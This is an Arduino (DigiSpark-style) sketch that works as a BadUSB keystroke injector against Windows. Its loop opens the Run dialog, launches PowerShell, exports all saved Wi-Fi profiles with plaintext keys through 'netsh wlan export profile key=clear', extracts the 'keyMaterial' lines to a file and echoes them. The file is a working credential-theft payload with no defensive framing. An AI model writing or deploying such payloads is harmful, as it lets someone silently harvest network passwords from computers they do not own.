
//#include "DigiKeyboard.h"
//#include "Arduino.h"
#include <WifiTool.h>
//void ctrKey(String);
//void runCommand(String);



WifiTool wifi;
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  wifi.ctrKey("r");
  wifi.runCommand("powershell");
  wifi.runCommand("netsh wlan export profile key=clear");
  wifi.runCommand("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-Pass");
  wifi.runCommand("echo Wi-Fi-Pass");
  delay(3000);
  wifi.runCommand("exit");
  
  //exit(0);
      

}

//
//void ctrKey(String key){
//    byte keyVal;
//    if (key == "r"){
//        keyVal = 21;
//    }
//    DigiKeyboard.sendKeyStroke(keyVal, MOD_GUI_LEFT);
//    //DigiKeyboard.delay(200);
//
//}
//
//void runCommand(String command){
//    DigiKeyboard.sendKeyStroke(0);
//    DigiKeyboard.println(command);
//    DigiKeyboard.delay(125);
//}
